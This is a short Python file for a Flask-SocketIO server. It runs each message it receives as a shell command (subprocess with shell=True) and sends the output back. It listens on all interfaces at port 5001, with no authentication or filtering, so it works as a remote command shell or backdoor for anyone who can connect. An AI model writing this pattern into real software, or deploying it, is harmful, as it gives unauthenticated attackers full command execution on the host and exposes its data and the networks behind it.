from flask import Flask
from flask_socketio import SocketIO, send
import subprocess

app = Flask(__name__)
socketio = SocketIO(app)

@socketio.on('message')
def handle_message(command):
    try:
        result = subprocess.run(command, shell=True, capture_output=True, text=True)
        send(result.stdout)
    except Exception as e:
        send(f"Error: {str(e)}")

if __name__ == '__main__':
    socketio.run(app, host='0.0.0.0', port=5001)

